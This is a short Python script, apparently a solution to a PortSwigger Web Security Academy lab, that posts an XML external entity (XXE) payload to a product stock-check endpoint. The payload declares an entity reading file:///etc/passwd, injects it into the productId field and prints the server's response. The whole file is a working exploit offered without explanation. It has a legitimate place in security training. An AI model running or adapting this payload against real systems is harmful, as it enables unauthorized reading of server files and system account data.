import requests
s = requests.Session()

stock_url = 'https://ac3e1f241f91bfc2802c90e2007000bb.web-security-academy.net/product/stock'
xml_post_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'

resp = s.post(stock_url,data=xml_post_data)
print(resp.text)